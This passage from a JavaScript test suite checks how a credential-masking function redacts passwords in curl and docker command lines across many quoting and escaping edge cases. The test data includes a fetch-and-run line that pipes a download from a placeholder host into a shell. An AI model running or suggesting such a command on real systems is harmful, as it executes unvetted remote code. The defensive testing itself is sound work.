  ['but not when the start of the command is not found: the line ending is the 200th item, so the pair is masked', `\\\ndocker ${'x'.repeat(192)} -u 1000:1000 img`, `\\\ndocker ${'x'.repeat(192)} -u 1000:[REDACTED] img`],
  // a variable of the command is a word of letters, digits and underscores that does not start with a digit, in any case
  ['a variable of the command in small letters', 'foo=bar docker run -u node:node img', 'foo=bar docker run -u node:node img'],
  ['with a digit and an underscore in its name, two of them', 'Foo_1=bar _x=1 docker run -u node:node img', 'Foo_1=bar _x=1 docker run -u node:node img'],
  ['an empty value is a variable too', 'foo= docker run -u node:node img', 'foo= docker run -u node:node img'],
  ['a word that starts with a digit is no variable: the first word of the command is not the client', '1foo=bar docker run -u node:node img', '1foo=bar docker run -u node:[REDACTED] img'],
  // A ; & | or a line ending INSIDE a quote or a URL looks like the end of a command, and the curl (or the URL) before it is then out of sight of the command that holds the flag. A numeric pair and a drive
  // and a path are judged by their shape alone, so they are a user and a password in a text that holds a curl or a :// anywhere before the flag. Only a command that starts with a container client has its
  // own place, and that place is the command.
  ['a & in a quoted URL before the flag', "curl 'https://api.example.com/v1?a=1&b=2' -u 5551234567:7391824", "curl 'https://api.example.com/v1?a=1&b=2' -u 5551234567:[REDACTED]"],
  ['and in double quotes', 'curl "https://api.example.com/v1?a=1&b=2" -u 5551234567:7391824', 'curl "https://api.example.com/v1?a=1&b=2" -u 5551234567:[REDACTED]'],
  ['a ; in a header', "curl -H 'Accept: text/html; q=0.9' -u 5551234567:7391824 https://api.example.com/v1", "curl -H 'Accept: text/html; q=0.9' -u 5551234567:[REDACTED] https://api.example.com/v1"],
  ['a | in a header', "curl -H 'X-Filter: a|b' -u 5551234567:7391824 https://api.example.com/v1", "curl -H 'X-Filter: a|b' -u 5551234567:[REDACTED] https://api.example.com/v1"],
  ['a & in the data', "curl -d 'a=1&b=2' -u 5551234567:7391824 https://api.example.com/v1", "curl -d 'a=1&b=2' -u 5551234567:[REDACTED] https://api.example.com/v1"],
  ['a ; in the data, with --user', 'curl --data "x=1;y=2" --user 5551234567:7391824 https://api.example.com/v1', 'curl --data "x=1;y=2" --user 5551234567:[REDACTED] https://api.example.com/v1'],
  ['a line ending in a quoted body', "curl -d '{\n  \"a\": 1\n}' -u 5551234567:7391824 https://api.example.com/v1", "curl -d '{\n  \"a\": 1\n}' -u 5551234567:[REDACTED] https://api.example.com/v1"],
  ['and a Windows line ending in it', "curl -d '{\r\n  \"a\": 1\r\n}' -u 5551234567:7391824 https://api.example.com/v1", "curl -d '{\r\n  \"a\": 1\r\n}' -u 5551234567:[REDACTED] https://api.example.com/v1"],
  ['--proxy-user', "curl 'https://api.example.com/v1?a=1&b=2' --proxy-user 5551234567:7391824 -x http://proxy.test:3128", "curl 'https://api.example.com/v1?a=1&b=2' --proxy-user 5551234567:[REDACTED] -x http://proxy.test:3128"],
  ['--user=', "curl 'https://api.example.com/v1?a=1&b=2' --user=5551234567:7391824", "curl 'https://api.example.com/v1?a=1&b=2' --user=5551234567:[REDACTED]"],
  ['curl.exe', "curl.exe 'https://api.example.com/v1?a=1&b=2' -u 5551234567:7391824", "curl.exe 'https://api.example.com/v1?a=1&b=2' -u 5551234567:[REDACTED]"],
  ['a drive and a path', `curl 'https://api.example.com/v1?a=1&b=2' -u c:/${V}`, "curl 'https://api.example.com/v1?a=1&b=2' -u c:[REDACTED]"],
  ['the word curl alone, with no URL before the flag (curl is the first word of the text)', "curl -d 'a=1&b=2' -u 5551234567:7391824", "curl -d 'a=1&b=2' -u 5551234567:[REDACTED]"],
  ['a URL alone, with no curl before the flag', "tool 'https://api.example.com/v1?a=1&b=2' -u 5551234567:7391824", "tool 'https://api.example.com/v1?a=1&b=2' -u 5551234567:[REDACTED]"],
  ['a body of 800 characters over several lines, then the flag on a continued line', `curl https://api.example.com/v1 \\\n  -d '{\n  "k": "${'v'.repeat(800)}"\n}' \\\n  -u 5551234567:7391824`, `curl https://api.example.com/v1 \\\n  -d '{\n  "k": "${'v'.repeat(800)}"\n}' \\\n  -u 5551234567:[REDACTED]`],
  ['and of 2000 characters', `curl https://api.example.com/v1 \\\n  -d '{\n  "k": "${'v'.repeat(2000)}"\n}' \\\n  -u 5551234567:7391824`, `curl https://api.example.com/v1 \\\n  -d '{\n  "k": "${'v'.repeat(2000)}"\n}' \\\n  -u 5551234567:[REDACTED]`],
  ['a curl 300 characters before the separator that is 10 characters before the flag', `curl -H 'X-Long: ${'v'.repeat(300)}' -d 'a=1;b=2' -u 5551234567:7391824 https://api.example.com/v1`, `curl -H 'X-Long: ${'v'.repeat(300)}' -d 'a=1;b=2' -u 5551234567:[REDACTED] https://api.example.com/v1`],
  // The same root cause one step further: a container word right AFTER such a separator makes "the command that holds the flag" start with that word, and the exemption of a container client would show any
  // pair, a user and a password with letters too. A quote that closes between the start of that command and the flag shows that the start stood inside a quote: it is no command.
  ['a ; in the data, then a container word: a user and a password with letters', `curl -d 'cmd=ls; docker ps' -u admin:${V} https://ci.example.test/api`, "curl -d 'cmd=ls; docker ps' -u admin:[REDACTED] https://ci.example.test/api"],
  ['a ; in a header, then docker run', `curl -H 'X-Cmd: a; docker run' -u admin:${V} https://ci.example.test/api`, "curl -H 'X-Cmd: a; docker run' -u admin:[REDACTED] https://ci.example.test/api"],
  ['a & in a quoted URL', `curl 'https://x.example.test/run?a=1&docker run' -u admin:${V}`, "curl 'https://x.example.test/run?a=1&docker run' -u admin:[REDACTED]"],
  ['a | in a header, with --proxy-user', `curl -H 'X: a | docker ps' --proxy-user admin:${V} -x http://proxy.test:3128 https://x.example.test`, "curl -H 'X: a | docker ps' --proxy-user admin:[REDACTED] -x http://proxy.test:3128 https://x.example.test"],
  ['a line ending in a quoted body', `curl -d 'echo hi\ndocker ps' --user admin:${V} https://ci.example.test/api`, "curl -d 'echo hi\ndocker ps' --user admin:[REDACTED] https://ci.example.test/api"],
  ['and a Windows line ending', `curl -d 'echo hi\r\ndocker ps' -u admin:${V} https://ci.example.test/api`, "curl -d 'echo hi\r\ndocker ps' -u admin:[REDACTED] https://ci.example.test/api"],
  ['podman', `curl -d 'a=1&podman ps' -u admin:${V} https://ci.example.test/api`, "curl -d 'a=1&podman ps' -u admin:[REDACTED] https://ci.example.test/api"],
  ['nerdctl', `curl -d 'a; nerdctl ps' -u admin:${V} https://ci.example.test/api`, "curl -d 'a; nerdctl ps' -u admin:[REDACTED] https://ci.example.test/api"],
  ['buildah', `curl -d 'a; buildah bud .' -u admin:${V} https://ci.example.test/api`, "curl -d 'a; buildah bud .' -u admin:[REDACTED] https://ci.example.test/api"],
  ['behind sudo', `curl -d 'a; sudo docker ps' -u admin:${V} https://ci.example.test/api`, "curl -d 'a; sudo docker ps' -u admin:[REDACTED] https://ci.example.test/api"],
  ['behind env and a variable', `curl -d 'a; env FOO=1 docker ps' -u admin:${V} https://ci.example.test/api`, "curl -d 'a; env FOO=1 docker ps' -u admin:[REDACTED] https://ci.example.test/api"],
  ['in double quotes', `curl -H "X-Cmd: a; docker ps" -u admin:${V} https://ci.example.test/api`, 'curl -H "X-Cmd: a; docker ps" -u admin:[REDACTED] https://ci.example.test/api'],
  ['with --user=', `curl -d 'cmd=ls; docker ps' --user=admin:${V} https://ci.example.test/api`, "curl -d 'cmd=ls; docker ps' --user=admin:[REDACTED] https://ci.example.test/api"],
  ['a second quoted argument between the quote and the flag', `curl -d 'a; docker ps' -H 'X: y' -u admin:${V} https://ci.example.test/api`, "curl -d 'a; docker ps' -H 'X: y' -u admin:[REDACTED] https://ci.example.test/api"],
  ['a quote that is escaped inside double quotes does not close the string', `curl -d "a; docker ps \\"" -u admin:${V} https://ci.example.test/api`, 'curl -d "a; docker ps \\"" -u admin:[REDACTED] https://ci.example.test/api'],
  ['a numeric pair (the shape of the first finding), after a container word', "curl -d 'cmd=ls; docker ps' -u 5551234567:7391824 https://ci.example.test/api", "curl -d 'cmd=ls; docker ps' -u 5551234567:[REDACTED] https://ci.example.test/api"],
  ['and a drive and a path', `curl -d 'cmd=ls; docker ps' -u c:/${V} https://ci.example.test/api`, "curl -d 'cmd=ls; docker ps' -u c:[REDACTED] https://ci.example.test/api"],
  // An escape can hide the quote that closes before the flag: the reading starts outside any quote, and the command really started inside one. In a single quote a backslash is a character, so the quote after it
  // closes the string; in PowerShell a backtick escapes a double quote inside a double-quoted string. A backslash before a single quote, or a backtick before a double quote, outside a quote: nobody can tell.
  ['a backslash before the closing single quote: in a single quote it is a character, and the quote closes the string', String.raw`curl -d 'a; docker run -v C:\data\' -u admin:${V} https://ci.example.test/api`, String.raw`curl -d 'a; docker run -v C:\data\' -u admin:[REDACTED] https://ci.example.test/api`],
  ['and with a numeric pair', String.raw`curl -d 'a; docker run -v C:\data\' -u 5551234567:7391824 https://ci.example.test/api`, String.raw`curl -d 'a; docker run -v C:\data\' -u 5551234567:[REDACTED] https://ci.example.test/api`],
  ['PowerShell: a backtick before a double quote inside a double-quoted string', `curl.exe -H "X: a; docker ps\`"" -u admin:${V} https://ci.example.test/api`, 'curl.exe -H "X: a; docker ps`"" -u admin:[REDACTED] https://ci.example.test/api'],
  ['and with a numeric pair', 'curl.exe -H "X: a; docker ps`"" -u 5551234567:7391824 https://ci.example.test/api', 'curl.exe -H "X: a; docker ps`"" -u 5551234567:[REDACTED] https://ci.example.test/api'],
  // The cut can stand inside more than a quote: a command substitution (the closing parenthesis, or the closing backtick, is not a quote), a quote inside a substitution inside a quote, a parameter expansion, and
  // an escaped separator, which separates nothing. In every one the command that "starts" after the cut starts inside something, and the container word after it is not the program of the flag.
  ['a pipe in a command substitution, then a container word, with no quote at all', `curl $(echo a | docker run img) -u admin:${V} https://ci.example.test/api`, 'curl $(echo a | docker run img) -u admin:[REDACTED] https://ci.example.test/api'],
  ['and with a numeric pair', 'curl $(echo a | docker run img) -u 5551234567:7391824 https://ci.example.test/api', 'curl $(echo a | docker run img) -u 5551234567:[REDACTED] https://ci.example.test/api'],
  ['PowerShell: a pipeline in a substitution', `curl.exe $(Get-Content f | docker run img) -u admin:${V} https://ci.example.test/api`, 'curl.exe $(Get-Content f | docker run img) -u admin:[REDACTED] https://ci.example.test/api'],
  ['a ; in a backtick substitution', `curl \`date; docker ps\` -u admin:${V} https://ci.example.test/api`, 'curl `date; docker ps` -u admin:[REDACTED] https://ci.example.test/api'],
  ['a ; in a substitution inside double quotes', `curl "$(cat f; docker ps -q)" -u admin:${V} https://ci.example.test/api`, 'curl "$(cat f; docker ps -q)" -u admin:[REDACTED] https://ci.example.test/api'],
  ['double quotes inside the substitution: the first quote closes an inner string, the parenthesis closes the substitution', `curl "$(echo "a; docker ps")" -u admin:${V} https://ci.example.test/api`, 'curl "$(echo "a; docker ps")" -u admin:[REDACTED] https://ci.example.test/api'],
  ['and single quotes inside it', `curl "$(echo 'a; docker ps')" -u admin:${V} https://ci.example.test/api`, `curl "$(echo 'a; docker ps')" -u admin:[REDACTED] https://ci.example.test/api`],
  ['a ; in a parameter expansion', 'curl ${H:-a; docker ps} -u admin:' + V + ' https://ci.example.test/api', 'curl ${H:-a; docker ps} -u admin:[REDACTED] https://ci.example.test/api'],
  ["a string of the form $'...'", "curl -d $'a\\nb; docker ps' -u admin:" + V + ' https://ci.example.test/api', "curl -d $'a\\nb; docker ps' -u admin:[REDACTED] https://ci.example.test/api"],
  ['and an escaped quote inside it', "curl -d $'it\\'s; docker ps' -u admin:" + V + ' https://ci.example.test/api', "curl -d $'it\\'s; docker ps' -u admin:[REDACTED] https://ci.example.test/api"],
  ['the idiom that writes an apostrophe inside single quotes', `curl -d 'it'"'"'s; docker ps' -u admin:${V} https://ci.example.test/api`, `curl -d 'it'"'"'s; docker ps' -u admin:[REDACTED] https://ci.example.test/api`],
  ['a container word on the last line of a quoted JSON body', `curl -d '{\n  "a": 1,\n  docker ps' -u admin:${V} https://ci.example.test/api`, `curl -d '{\n  "a": 1,\n  docker ps' -u admin:[REDACTED] https://ci.example.test/api`],
  ['a lone carriage return in a quoted body', `curl -d 'a\rdocker ps' -u admin:${V} https://ci.example.test/api`, `curl -d 'a\rdocker ps' -u admin:[REDACTED] https://ci.example.test/api`],
  ['docker.exe after the cut', `curl -d 'x; docker.exe ps' -u admin:${V} https://ci.example.test/api`, "curl -d 'x; docker.exe ps' -u admin:[REDACTED] https://ci.example.test/api"],
  ['a path to docker after the cut', `curl -d 'x; /usr/bin/docker ps' -u admin:${V} https://ci.example.test/api`, "curl -d 'x; /usr/bin/docker ps' -u admin:[REDACTED] https://ci.example.test/api"],
  ['a variable and then docker after the cut', `curl -d 'x; FOO=bar docker ps' -u admin:${V} https://ci.example.test/api`, "curl -d 'x; FOO=bar docker ps' -u admin:[REDACTED] https://ci.example.test/api"],
  ['sudo and a flag of it after the cut', `curl -d 'x; sudo -E docker ps' -u admin:${V} https://ci.example.test/api`, "curl -d 'x; sudo -E docker ps' -u admin:[REDACTED] https://ci.example.test/api"],
  ['an escaped ; separates nothing', 'curl -d a\\;docker run -u admin:' + V + ' https://ci.example.test/api', 'curl -d a\\;docker run -u admin:[REDACTED] https://ci.example.test/api'],
  ['an escaped &', 'curl -d a\\&docker run -u admin:' + V + ' https://ci.example.test/api', 'curl -d a\\&docker run -u admin:[REDACTED] https://ci.example.test/api'],
  ['an escaped |', 'curl -d a\\|docker run -u admin:' + V + ' https://ci.example.test/api', 'curl -d a\\|docker run -u admin:[REDACTED] https://ci.example.test/api'],
  ['a caret escapes the & in cmd', 'curl -d a^&docker run -u admin:' + V + ' https://ci.example.test/api', 'curl -d a^&docker run -u admin:[REDACTED] https://ci.example.test/api'],
  ['a backtick escapes the ; in PowerShell', 'curl.exe -d a`;docker run -u admin:' + V + ' https://ci.example.test/api', 'curl.exe -d a`;docker run -u admin:[REDACTED] https://ci.example.test/api'],
  ['and with a numeric pair', 'curl -d a\\;docker ps -u 5551234567:7391824 https://ci.example.test/api', 'curl -d a\\;docker ps -u 5551234567:[REDACTED] https://ci.example.test/api'],
  // Found by fuzzing nested quoting (strings in substitutions in strings): a backtick that the reading meets INSIDE what it takes for a quote, and a continuation in such a place, are not read; a bracket closes
  // only a bracket of its own kind; a group with a quote inside it is nested quoting, which is not read.
  ['a backtick substitution inside double quotes, with the idiom for an apostrophe in it', 'curl --data-raw "` \' &  /usr/bin/docker \'"\'"\' sudo docker ls\' C:/tmpimg`" -u admin:' + V + ' https://ci.example.test/api', 'curl --data-raw "` \' &  /usr/bin/docker \'"\'"\' sudo docker ls\' C:/tmpimg`" -u admin:[REDACTED] https://ci.example.test/api'],
  ['a backtick that ends a line inside a string is no continuation', "curl -d \"` $'&& FOO=bar docker '  'C:/tmp'  $' nerdctl node:node'  '\" nerdctl ' `\n\" -u svc_user:" + V + ' https://ci.example.test/api', "curl -d \"` $'&& FOO=bar docker '  'C:/tmp'  $' nerdctl node:node'  '\" nerdctl ' `\n\" -u svc_user:[REDACTED] https://ci.example.test/api"],
  ['a brace and a parenthesis do not close each other', 'curl $(echo a; docker run { ) ( } -u admin:' + V + ' https://ci.example.test/api)', 'curl $(echo a; docker run { ) ( } -u admin:[REDACTED] https://ci.example.test/api)'],
  ['and the same with the brackets as values of flags, so that the command would be a plain one', 'curl $(echo a; docker run -e { -e ) -e ( -e } -u admin:' + V + ' https://ci.example.test/api)', 'curl $(echo a; docker run -e { -e ) -e ( -e } -u admin:[REDACTED] https://ci.example.test/api)'],
  ['a backtick that ends a line inside a string is no continuation (a plain command)', 'docker run -e "a `\nb" -u svc:' + V + ' img', 'docker run -e "a `\nb" -u svc:[REDACTED] img'],
  ['a closing parenthesis before an opening one', 'curl $(echo a; docker ps )( -u admin:' + V + ' https://ci.example.test/api)', 'curl $(echo a; docker ps )( -u admin:[REDACTED] https://ci.example.test/api)'],
  ['three backslashes before a ;: the third escapes it', 'curl -d a\\\\\\;docker run -u admin:' + V + ' https://ci.example.test/api', 'curl -d a\\\\\\;docker run -u admin:[REDACTED] https://ci.example.test/api'],
  ['a quote that the reading takes for the end of a string, a brace in the next, and the closing parenthesis of the substitution', `curl "$(echo 'a\nbuildah '"'"'{x=1' -v)" -u admin:${V} https://ci.example.test/api`, `curl "$(echo 'a\nbuildah '"'"'{x=1' -v)" -u admin:[REDACTED] https://ci.example.test/api`],
  // what stays: only what stands BEFORE the flag counts, and a command that starts with a container client keeps its own place
  ['quotes that close inside a container command stay balanced: the flag is the flag of docker', "docker run -e 'A=b' --label \"x y\" -u node:node img", "docker run -e 'A=b' --label \"x y\" -u node:node img"],
  ['an apostrophe inside double quotes is no quote', 'docker run --label "it\'s" -u node:node img', 'docker run --label "it\'s" -u node:node img'],
  ['and a double quote inside single quotes', "docker run --label 'say \"hi\"' -u node:node img", "docker run --label 'say \"hi\"' -u node:node img"],
  ['a backslash is no escape inside single quotes', "docker run -v 'C:\\data\\' -u node:node img", "docker run -v 'C:\\data\\' -u node:node img"],
  ['a stray apostrophe before the separator of a real command does not count: the reading starts at the command', "echo don't; docker run -u node:node img", "echo don't; docker run -u node:node img"],
  ['a curl with a ; in a quote, then a real container command', "curl -H 'X: a;b' https://x.example.test ; docker run -u node:node img", "curl -H 'X: a;b' https://x.example.test ; docker run -u node:node img"],
  ['a numeric pair in a container command with quotes', "docker run -e 'A=b' -u 1000:1000 img", "docker run -e 'A=b' -u 1000:1000 img"],
  ['an escaped quote inside double quotes does not close them: the quotes of the command are balanced', 'docker run -e "A=\\"b\\"" -u node:node img', 'docker run -e "A=\\"b\\"" -u node:node img'],
  ['a backslash escapes one character: two of them and a quote leave the quote open, the flag after it is masked', 'docker run -e A=\\\\"b -u node:node img', 'docker run -e A=\\\\"b -u node:[REDACTED] img'],
  ['the one edge: a double-quoted path that ends in a backslash leaves the quote open for this reading, so the flag after it is masked', 'docker run -v "C:\\data\\" -u node:node img', 'docker run -v "C:\\data\\" -u node:[REDACTED] img'],
  ['a backslash before an apostrophe INSIDE double quotes is a character: the quotes are balanced', 'docker run -e "A=it\\\'s" -u node:node img', 'docker run -e "A=it\\\'s" -u node:node img'],
  ['an escaped double quote outside quotes is a character: the quote that closes a string still opens one for the reading', 'docker run -e A=\\"b -u node:node img', 'docker run -e A=\\"b -u node:node img'],
  ['the edges of the escapes: a backslash before an apostrophe outside quotes may be the end of a string that the command started in, so the flag after it is masked', "docker run -e A=it\\'s -u node:node img", "docker run -e A=it\\'s -u node:[REDACTED] img"],
  ['and a backtick before a double quote outside quotes (PowerShell)', 'docker run -e A=it`"s -u node:node img', 'docker run -e A=it`"s -u node:[REDACTED] img'],
  ['a backslash before any other character outside quotes (a path of Windows) is no quote', 'docker run -v C:\\data:/data -u node:node img', 'docker run -v C:\\data:/data -u node:node img'],
  ['and a backtick that continues a line (PowerShell) is no quote either', 'docker run `\n  -v data:/data `\n  -u node:node img', 'docker run `\n  -v data:/data `\n  -u node:node img'],
  ['an apostrophe inside double quotes in a container command (a name)', 'docker run -e "NAME=O\'Brien" -u node:node img', 'docker run -e "NAME=O\'Brien" -u node:node img'],
  ['a command substitution that closes in the command: the parentheses are balanced', 'docker run -v $(pwd):/app -u node:node img', 'docker run -v $(pwd):/app -u node:node img'],
  ['and inside double quotes', 'docker run -e "X=$(date +%s)" -u node:node img', 'docker run -e "X=$(date +%s)" -u node:node img'],
  ['an edge: a backtick substitution in the command is not read (nobody can tell if it ends there or began before): the flag after it is masked', 'docker run -e A=`date` -u node:node img', 'docker run -e A=`date` -u node:[REDACTED] img'],
  ["an edge: a string of the form $'...' in the command is not read either", "docker run -e A=$'x\\ny' -u node:node img", "docker run -e A=$'x\\ny' -u node:[REDACTED] img"],
  ['but a $ before a quote inside single quotes is a character, and a $ at the end of double quotes too', `docker run -e 'A=$' -e "B=$" -u node:node img`, `docker run -e 'A=$' -e "B=$" -u node:node img`],
  ['the idiom for an apostrophe inside single quotes, balanced', `docker run -e A='it'"'"'s' -u node:node img`, `docker run -e A='it'"'"'s' -u node:node img`],
  ['braces of a template, balanced', "docker run --format '{{.ID}}' -u node:node img", "docker run --format '{{.ID}}' -u node:node img"],
  ['an opening parenthesis alone inside quotes is a character', "docker run -e 'A=(' -u node:node img", "docker run -e 'A=(' -u node:node img"],
  ['an escaped ; before a real one: the real one separates', 'echo a\\;; docker run -u node:node img', 'echo a\\;; docker run -u node:node img'],
  ['an escaped backslash before a ;: the ; is real', 'echo a\\\\; docker run -u node:node img', 'echo a\\\\; docker run -u node:node img'],
  ['a curl with an escaped ; and then a real container command', 'curl -d a\\;b https://x.example.test ; docker run -u node:node img', 'curl -d a\\;b https://x.example.test ; docker run -u node:node img'],
  ['the flag inside the quoted data is data, not a flag of curl (the documented limit of a flag inside a quoted string): it is shown', "curl -d 'cmd=ls; docker run -u admin:" + V + " img' https://ci.example.test/api", "curl -d 'cmd=ls; docker run -u admin:" + V + " img' https://ci.example.test/api"],
  ['but a docker command with no user and group in it (ps) is masked, in a string or not', "curl -d 'cmd=ls; docker ps -u admin:" + V + "' https://ci.example.test/api", "curl -d 'cmd=ls; docker ps -u admin:[REDACTED]' https://ci.example.test/api"],
  ['an edge: a closing parenthesis inside quotes with no opening one is masked (a smiley in a label)', 'docker run --label "a :)" -u node:node img', 'docker run --label "a :)" -u node:[REDACTED] img'],
  ['an edge: a quote inside a substitution is nested quoting, which is not read: the flag after it is masked', `docker run -e "X=$(echo 'x')" -u node:node img`, `docker run -e "X=$(echo 'x')" -u node:[REDACTED] img`],
  ['and a quote inside a brace expansion', `docker run -e "H=\${X:-'a'}" -u node:node img`, `docker run -e "H=\${X:-'a'}" -u node:[REDACTED] img`],
  ['an edge: a brace that stays open before the flag', 'docker run ${x -u node:node img', 'docker run ${x -u node:[REDACTED] img'],
  ['and as the value of a flag, which the words alone would not refuse', 'docker run -e ${x -u node:node img', 'docker run -e ${x -u node:[REDACTED] img'],
  ['a quote at the start of a continued line is read', 'docker run -e \\\n"x y" -u node:node img', 'docker run -e \\\n"x y" -u node:node img'],
  ['and a flag at the start of one', 'docker run \\\n-w /app -u node:node img', 'docker run \\\n-w /app -u node:node img'],
  ['a braces expansion that closes in the command, and the template of docker, are no reason', 'docker run -e "H=${HOME}" --format {{.ID}} -u node:node img', 'docker run -e "H=${HOME}" --format {{.ID}} -u node:node img'],
  ['an edge: a backtick inside double quotes (an escape of PowerShell) is not read: the flag after it is masked', 'docker run -e "A=`$x" -u node:node img', 'docker run -e "A=`$x" -u node:[REDACTED] img'],
  ['a continuation in front of the flag is no backtick: a PowerShell command over several lines stays readable, quotes and all', 'docker run `\n  -e "A=b" `\n  -v "$(pwd):/app" `\n  -u node:node img', 'docker run `\n  -e "A=b" `\n  -v "$(pwd):/app" `\n  -u node:node img'],
  ['an edge: a parenthesis that stays open before the flag: the flag is inside a group, masked', 'docker run $(echo -u node:node img', 'docker run $(echo -u node:[REDACTED] img'],
  ['and as the value of a flag', 'docker run -e $(echo -u node:node img', 'docker run -e $(echo -u node:[REDACTED] img'],
  ['a URL after the flag is not before it: the pair is a user id and a group id', 'tool -u 1000:1000 https://api.example.com/v1', 'tool -u 1000:1000 https://api.example.com/v1'],
  ['a container command after a curl, behind a ;, keeps its place (a user and a group)', 'curl https://x.example.test -o f; docker run -u node:node img', 'curl https://x.example.test -o f; docker run -u node:node img'],
  ['and with a numeric pair', 'curl https://x.example.test -o f; docker run -u 1000:1000 img', 'curl https://x.example.test -o f; docker run -u 1000:1000 img'],
  ['and behind a line ending', 'curl -fsSL https://x.example.test | sh\ndocker run -u 1000:1000 img', 'curl -fsSL https://x.example.test | sh\ndocker run -u 1000:1000 img'],
  ['the one over-mask that remains: the numeric pair of an unknown tool after a curl earlier in the text', 'curl https://x.example.test\ntool -u 1234:5678 x', 'curl https://x.example.test\ntool -u 1234:[REDACTED] x'],
  ['and after a URL', 'wget https://x.example.test\ntool -u 1234:5678 x', 'wget https://x.example.test\ntool -u 1234:[REDACTED] x'],
  ['a drive and a path after a URL in the same text: masked too', 'git clone https://x.example.test r\ndiff -u C:\\a\\old.txt C:\\a\\new.txt', 'git clone https://x.example.test r\ndiff -u C:[REDACTED] C:\\a\\new.txt'],
];
for (const [label, line, expected] of COMMAND_LINES) assert.equal(maskSecrets(line, []), expected, `${label}: not the line that was expected`);
ok(`${COMMAND_LINES.length} lines on the edges of the flags and the tags (their limits, glued words, reads, short values, several in a line)`);

// Two spellings of the flag of the user that the rule did not see (the follow-up of round 5 of the audit of PR #103). The flag was a word of its own with a blank after it:
//  - the user glued to the flag: curl -uadmin:secret (the short flag only: --user and --proxy-user need a blank or an equals sign);
//  - a quote right before the flag: CURL_OPTS='-u admin:secret', echo "-u admin:secret", and the same in the JSON text of a tool call ("args":"-u admin:secret ..."), where EVERY string value starts after a quote.
// They are judged like the flag with a blank: a user and a password are masked, a user and a group of a container command and a numeric pair or a drive path (by their shape) stay.
{
  const FLAG_SPELLINGS = [
    // the user glued to the flag
    ['glued: curl -uUSER:PW', `curl -uadmin:${V} https://x.example.test`, 'curl -uadmin:[REDACTED] https://x.example.test'],
    ['glued: the capital U of curl (the proxy user)', `curl -Uproxy:${V} https://x.example.test`, 'curl -Uproxy:[REDACTED] https://x.example.test'],
    ['glued, any tool: a user and a password are masked', `tool -uadmin:${V} run`, 'tool -uadmin:[REDACTED] run'],
    ['glued, in double quotes', `curl -u"admin:${V}" https://x.example.test`, 'curl -u"admin:[REDACTED]" https://x.example.test'],
    ['glued, in single quotes', `curl -u'admin:${V}' https://x.example.test`, "curl -u'admin:[REDACTED]' https://x.example.test"],
    ['glued: a user of one character', `tool -ua:${V} run`, 'tool -ua:[REDACTED] run'],
    ['glued, a numeric pair after a curl: curl\'s, masked', 'curl -u5551234567:7391824 https://x.example.test', 'curl -u5551234567:[REDACTED] https://x.example.test'],
    ['glued, a numeric pair and no curl anywhere: a user id and a group id', 'tool -u1000:1000 run', 'tool -u1000:1000 run'],
    ['glued, a user and a group of a container command', 'docker run -unode:node img', 'docker run -unode:node img'],
    ['glued, a numeric pair of a container command', 'docker run -u1000:1000 -v /srv:/srv img', 'docker run -u1000:1000 -v /srv:/srv img'],
    ['glued, behind sudo', 'sudo docker exec -uroot:root web sh', 'sudo docker exec -uroot:root web sh'],
    ['glued, a user and a group of a command that is not a container client: masked', 'tool -unode:node run', 'tool -unode:[REDACTED] run'],
    ['glued, a drive path', 'diff -uC:\\a\\old.txt C:\\a\\new.txt', 'diff -uC:\\a\\old.txt C:\\a\\new.txt'],
    ['glued, with no colon there is no password: mysql -uroot keeps its user, the -p is masked', `mysql -uroot -p${V} db`, 'mysql -uroot -p[REDACTED] db'],
    ['glued: -u and a word with no colon', 'tool -uroot run', 'tool -uroot run'],
    ['glued, a read of a variable is no secret', 'curl -u$USER:$PASS https://x.example.test', 'curl -u$USER:$PASS https://x.example.test'],
    ['glued to a word is still no flag', 'foo-uadmin:' + V, 'foo-uadmin:' + V],
    ['a time format after -u is no user and password', 'date -u+%H:%M', 'date -u+%H:%M'],
    ['the long flags need their blank: --userid:x is not --user', 'tool --userid:abcd run', 'tool --userid:abcd run'],
    ['and --proxy-userid:x is not --proxy-user', 'tool --proxy-userid:abcd run', 'tool --proxy-userid:abcd run'],
    ['an equals sign and then a quoted value of -u', `curl -u="admin:${V}" https://x.example.test`, 'curl -u="admin:[REDACTED]" https://x.example.test'],
    ['several blanks after --user', `curl --user   admin:${V} url`, 'curl --user   admin:[REDACTED] url'],
    ['tabs after --proxy-user', `curl --proxy-user\t\tproxy:${V} url`, 'curl --proxy-user\t\tproxy:[REDACTED] url'],
    ['two blanks after -u and a quote', `curl -u  "admin:${V}" url`, 'curl -u  "admin:[REDACTED]" url'],
    // a quote right before the flag
    ["a variable of options in single quotes", `CURL_OPTS='-u admin:${V}'`, "CURL_OPTS='-u admin:[REDACTED]'"],
    ['a message in double quotes', `echo "-u admin:${V}"`, 'echo "-u admin:[REDACTED]"'],
    ['--user after a quote', `export OPTS="--user admin:${V} --silent"`, 'export OPTS="--user admin:[REDACTED] --silent"'],
    ['--proxy-user after a quote', `x='--proxy-user proxy:${V}'`, "x='--proxy-user proxy:[REDACTED]'"],
    ['a glued flag after a quote', `OPTS='-uadmin:${V}'`, "OPTS='-uadmin:[REDACTED]'"],
    ['the equals sign after a quote', `OPTS="--user=admin:${V}"`, 'OPTS="--user=admin:[REDACTED]"'],
    ['a numeric pair after a quote, no curl anywhere: by its shape it stays', 'echo "-u 1000:1000"', 'echo "-u 1000:1000"'],
    ['a numeric pair after a quote and a curl: masked', 'curl -d x https://h.example.test; echo "-u 1000:1000"', 'curl -d x https://h.example.test; echo "-u 1000:[REDACTED]"'],
    ['a quote right before the flag of a container command: the quote is open at the flag, so it is masked', "docker run img '-u node:node'", "docker run img '-u node:[REDACTED]'"],
    ['the flag in the JSON text of a tool call (a string value starts after a quote)', `{"args":"-u admin:${V} https://x.example.test"}`, '{"args":"-u admin:[REDACTED] https://x.example.test"}'],
    ['and the same in a YAML list', `args: "-u admin:${V}"`, 'args: "-u admin:[REDACTED]"'],
    ['the curl is in another field of the JSON text, so the numeric pair is a password', '{"program":"curl","args":"-u 5551234567:7391824 https://x.example.test"}', '{"program":"curl","args":"-u 5551234567:[REDACTED] https://x.example.test"}'],
    ['a quote in front of anything but a flag changes nothing', `echo "x-u admin:${V}" "y"`, `echo "x-u admin:${V}" "y"`],
    ['a long flag that is none of ours, after a quote: --ux is not -u', `tool "--ux admin:${V}" run`, `tool "--ux admin:${V}" run`],
  ];
  const wrong = FLAG_SPELLINGS.map(([label, line, expected]) => [label, line, expected, maskSecrets(line, [])]).filter(([, , expected, got]) => got !== expected)
    .map(([label, line, expected, got]) => `${label}: ${JSON.stringify(line)} -> ${JSON.stringify(got)}, expected ${JSON.stringify(expected)}`);
